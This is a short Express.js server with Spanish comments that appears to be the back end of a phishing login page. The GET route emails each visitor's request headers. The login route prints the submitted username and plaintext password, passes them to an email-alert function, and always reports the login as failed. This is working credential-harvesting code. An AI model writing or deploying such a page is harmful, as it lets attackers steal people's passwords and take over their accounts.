const express = require("express");
const bodyParser = require("body-parser");
require("dotenv").config();
const { alertarInicioSesion, alertarVisita } = require("./email_alerts");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));

app.get("/", async (req, res) => {
    const headers = req.headers;

    try {
        await alertarVisita(headers); // Enviar alerta por correo
    } catch (error) {
        console.error("Error al enviar la alerta de visita:", error);
    }
    
    res.render("login", { error: null });
});

app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    console.log("Usuario:", username);
    console.log("Contraseña:", password);

    // Enviar alerta por correo electrónico
    await alertarInicioSesion(username, password);

    // Mostrar el error en la vista
    res.render("login", { error: "Error: Usuario o contraseña incorrectos." });
});

app.listen(3000, () => console.log("Servidor en http://localhost:3000"));
